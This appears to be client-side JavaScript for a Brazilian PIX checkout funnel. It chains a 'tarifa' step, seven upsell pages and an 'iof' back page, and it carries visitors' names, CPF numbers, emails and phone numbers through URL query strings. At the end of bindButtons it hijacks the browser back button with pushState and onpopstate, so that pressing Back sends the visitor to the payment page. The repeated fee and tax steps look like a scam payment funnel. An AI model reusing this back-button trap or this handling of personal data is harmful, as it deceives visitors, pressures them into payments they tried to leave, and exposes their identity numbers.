(function () {
  var NEXT = {"tarifa":"..\/up2\/index.html","up2":"..\/up3\/index.html","up3":"..\/up4\/index.html","up4":"..\/up5\/index.html","up5":"..\/up6\/index.html","up6":"..\/up7\/index.html","up7":"..\/up8\/index.html","up8":""};

  function getParams() {
    var params = {};
    var q = window.location.search.substring(1).split('&');
    q.forEach(function (part) {
      var kv = part.split('=');
      if (kv[0]) params[kv[0]] = decodeURIComponent((kv[1] || '').replace(/\+/g, ' '));
    });
    return params;
  }

  function buildPixUrl(produto) {
    var params = getParams();
    var qs = new URLSearchParams();
    qs.set('produto', produto);
    var name = params.name || params.nome || '';
    var doc = params.document || params.cpff || params.cpf || '';
    if (name) qs.set('name', name);
    if (doc) qs.set('document', doc);
    if (params.email) qs.set('email', params.email);
    var tel = params.telephone || params.telefone || '';
    if (!tel && window.RR_CPF && RR_CPF.getTelefone) tel = RR_CPF.getTelefone();
    if (!tel) {
      try { tel = sessionStorage.getItem('rr_telefone') || ''; } catch (e) {}
    }
    if (tel) qs.set('telephone', tel);
    if (NEXT[produto]) qs.set('next', NEXT[produto]);
    ['utm_source', 'utm_campaign', 'utm_medium', 'utm_content'].forEach(function (k) {
      if (params[k]) qs.set(k, params[k]);
    });
    var base = '../pagamento/pix.html';
    if (location.pathname.indexOf('/back/') >= 0) base = '../pagamento/pix.html';
    if (location.pathname.indexOf('/tarifa/') >= 0) base = '../../../../pagamento/pix.html';
    return base + '?' + qs.toString();
  }

  function patchCheckoutBase() {
    document.querySelectorAll('a[href*="pagamento/pix.html"]').forEach(function (a) {
      var u = new URL(a.href, location.href);
      if (!u.searchParams.get('produto')) return;
      var p = getParams();
      if (p.name || p.nome) u.searchParams.set('name', p.name || p.nome);
      if (p.document || p.cpff || p.cpf) u.searchParams.set('document', p.document || p.cpff || p.cpf);
      a.href = u.pathname + '?' + u.searchParams.toString();
    });
  }

  function bindButtons() {
    var params = getParams();
    var path = location.pathname.toLowerCase();
    var produto = 'tarifa';
    if (path.indexOf('/up2/') >= 0) produto = 'up2';
    else if (path.indexOf('/up3/') >= 0) produto = 'up3';
    else if (path.indexOf('/up4/') >= 0) produto = 'up4';
    else if (path.indexOf('/up5/') >= 0) produto = 'up5';
    else if (path.indexOf('/up6/') >= 0) produto = 'up6';
    else if (path.indexOf('/up7/') >= 0) produto = 'up7';
    else if (path.indexOf('/up8/') >= 0) produto = 'up8';
    else if (path.indexOf('/back/') >= 0) produto = 'iof';

    function goCheckout(e) {
      if (e) { e.preventDefault(); e.stopPropagation(); }
      window.location.href = buildPixUrl(produto);
    }

    var btn = document.getElementById('btnCheckout');
    if (btn) {
      btn.addEventListener('click', goCheckout);
      if (btn.tagName === 'A') btn.setAttribute('href', buildPixUrl(produto));
    }

    document.querySelectorAll('.cta, .btn-green, .btn').forEach(function (el) {
      if (el.id === 'btnCheckout') return;
      if (el.getAttribute('href') && el.getAttribute('href').indexOf('pagamento/pix.html') >= 0) {
        el.addEventListener('click', goCheckout);
      }
    });

    if (typeof redirectToCheckout === 'function') {
      window.redirectToCheckout = goCheckout;
    }

    var backTarget = buildPixUrl(produto);
    history.pushState(null, '', location.href);
    window.onpopstate = function () {
      window.location.href = backTarget;
    };
  }

  document.addEventListener('DOMContentLoaded', function () {
    patchCheckoutBase();
    bindButtons();
  });
})();